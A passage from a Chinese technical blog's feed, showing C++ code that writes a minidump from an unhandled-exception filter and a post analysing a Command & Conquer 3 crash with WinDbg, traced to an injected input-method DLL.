CNXExpRpt::NXUnhandledExceptionFilter(</div><div class="line">	PEXCEPTION_POINTERS lpExceptionInfo)</div><div class="line">&#123;</div><div class="line"></div><div class="line">	MINIDUMP_EXCEPTION_INFORMATION mdei = &#123;0&#125;;</div><div class="line">	MINIDUMP_TYPE	mdt;</div><div class="line">	BOOL			retv = FALSE;</div><div class="line">	HANDLE			hFile = 0;</div><div class="line"></div><div class="line">	hFile = CreateFile(m_szLogFileName, GENERIC_READ | GENERIC_WRITE,</div><div class="line">		0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);</div><div class="line">	if (hFile == INVALID_HANDLE_VALUE )</div><div class="line">		return FALSE;</div><div class="line"></div><div class="line">	mdei.ThreadId			= GetCurrentThreadId();</div><div class="line">	mdei.ExceptionPointers	= lpExceptionInfo;</div><div class="line">	mdei.ClientPointers		= FALSE;</div><div class="line"></div><div class="line">	mdt	= MiniDumpNormal;</div><div class="line">	retv = MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),</div><div class="line">		hFile, mdt, ( lpExceptionInfo != 0 ) ? &amp;mdei : 0, 0, 0);</div><div class="line"></div><div class="line">	CloseHandle(hFile);</div><div class="line">	return (LONG)retv;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>一般在使用这种方法时，需要注意是否有其他的异常回调函数，很有可能我们的代码不会捕获这次异常，有可能会被调试器或者veh或者其他的seh接管。所以一般可能我们还会hook 掉设置异常的系统api，让异常能够被我们接管，这样就可以自己生产dmp文件了</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近一段时间在帮一个同学调代码（当然是萌妹子，要不然谁会高兴看别人的代码啊喂！！！）发现妹子写的代码进程容易crash掉。其实作为windows开发员很头疼的就是程序编译通过但是在运行的时候crash掉。但是作为一个软件调试者，最基本的crash后dmp的抓取和分析是基本的技能了。这段时间趁着这个机会也回顾下这些知识然后总结下来。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://venidic.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="windbg" scheme="http://venidic.com/tags/windbg/"/>
    
      <category term="dmp" scheme="http://venidic.com/tags/dmp/"/>
    
  </entry>
  
  <entry>
    <title>[命令与征服]崩溃分析</title>
    <link href="http://venidic.com/2015/09/20/%E5%91%BD%E4%BB%A4%E4%B8%8E%E5%BE%81%E6%9C%8D%E5%B4%A9%E6%BA%83%E5%88%86%E6%9E%90/"/>
    <id>http://venidic.com/2015/09/20/命令与征服崩溃分析/</id>
    <published>2015-09-20T00:54:02.000Z</published>
    <updated>2015-11-19T11:57:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>今日突然间想玩《命令与征服》系列的游戏，于是兴致勃勃的下载下来准备好好把玩一下，谁知道运行游戏，bgm响起，我撩起了袖子准备好好大干一场的时候发现，妈蛋，这特么什么鬼，游戏崩溃退出了 (ノಠ益ಠ)ノ彡┻━┻<br><a id="more"></a><br>我很生气，我非常生气，我生气的不行，随便OD载入，发现了游戏逻辑是CNC3.exe寻找相应的补丁之后拉起游戏主程序cnc3game.dat(这其实是一个可执行文件)，最后运行游戏。最开始我以为是补丁的问题，然后我在各种网站上求得了各种补丁，然而并没啥卵用，游戏还是在不断的崩溃<br><img src="http://img.blog.csdn.net/20151012090703594" alt="这里写图片描述"><br>可是他到底在哪崩溃的呢？跟了一下发现没有在补丁地方崩溃，<br><img src="http://img.blog.csdn.net/20151012091310404" alt="这里写图片描述"><br>大体先看下他的函数调用，然后碰巧发现了下面的信息：<br><img src="http://img.blog.csdn.net/20151012091340523" alt="这里写图片描述"><br>(ノಠ益ಠ)ノ彡┻━┻  妈蛋这是啥玩意！！！<strong>crush.dmp</strong><br>得，先分析下他看是什么鬼。<br>windbg载入dmp文件分析：<br><img src="http://img.blog.csdn.net/20151012091653768" alt="这里写图片描述"><br>顺便看下栈回溯：<br><img src="http://img.blog.csdn.net/20151012091802267" alt="这里写图片描述"><br>大体可以判断出错原因，搜狗输入法注入了一个dll到游戏进程中，在游戏启动的时候因为esi寄存器为0，所以试图读取0x00000044这个地址的内容，自然就崩溃掉了。<br>之后会详细分析具体到哪个地方导致了崩溃和具体的修复方案，先让我先把搜狗输入法卸载掉好好把玩下这个游戏吧！（逃…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今日突然间想玩《命令与征服》系列的游戏，于是兴致勃勃的下载下来准备好好把玩一下，谁知道运行游戏，bgm响起，我撩起了袖子准备好好大干一场的时候发现，妈蛋，这特么什么鬼，游戏崩溃退出了 (ノಠ益ಠ)ノ彡┻━┻&lt;br&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="http://venidic.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="游戏分析" scheme="http://venidic.com/tags/%E6%B8%B8%E6%88%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
